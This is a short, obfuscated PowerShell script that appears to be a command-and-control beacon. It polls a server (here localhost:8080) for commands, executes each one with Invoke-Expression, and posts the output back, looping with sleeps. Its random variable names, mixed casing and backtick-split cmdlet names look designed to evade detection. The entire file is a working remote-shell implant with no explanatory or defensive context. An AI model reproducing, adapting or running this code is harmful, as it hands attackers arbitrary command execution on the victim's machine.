
    $nitDUR = nEW-`OB`JECT miCRoSOft.PoWeRShELL.COMMANdS.WeBReqUeSTSESSiOn
        $WgafJa = nEW-`OB`JECT SYStEM.NEt.cOOKIe     
        $WgafJa.Name = "cGZUzf"
        $WgafJa.Value = "4256"
        $WgafJa.Domain = "localhost"
        $nitDUR.COOkiEs.ADd($WgafJa);
    funCTIOn TwFpTu {
        
        $UiHbrh = INVOKE-WEBREqueST "http://localhost:8080/getcommand/EzuWsx" -WebseSsIoN $nitDUR 
        return $UiHbrh.cOnTeNT 
    }
    funCTIOn ozzUoO([string]$kxLAHb){
        $kxLAHb  =(iex $kxLAHb 2>&1 | Out-String )
        return $kxLAHb
    }
    funCTIOn vnAarD([string]$command){
    

        $KiAuAs = @{VxAGeF=$command}
        $req = INVOKE-WEBREqueST "http://localhost:8080/response/mskd" -WebseSsIoN $nitDUR -Method POST -Body $KiAuAs 
    }
    $tuSNjW = 1
    
    WhILe ($tuSNjW -lE 5 -aNd $tuSNjW -nE 3)
    {
        $kxLAHb = TwFpTu
        if($kxLAHb.Trim() -eq "none"){
        Start-S`lEep -s 1
    
        }
        eLSE{
        $kxLAHb = ozzUoO($kxLAHb)
        vnAarD($kxLAHb)
    
        }
        
        Start-S`lEep -s 1
    }
    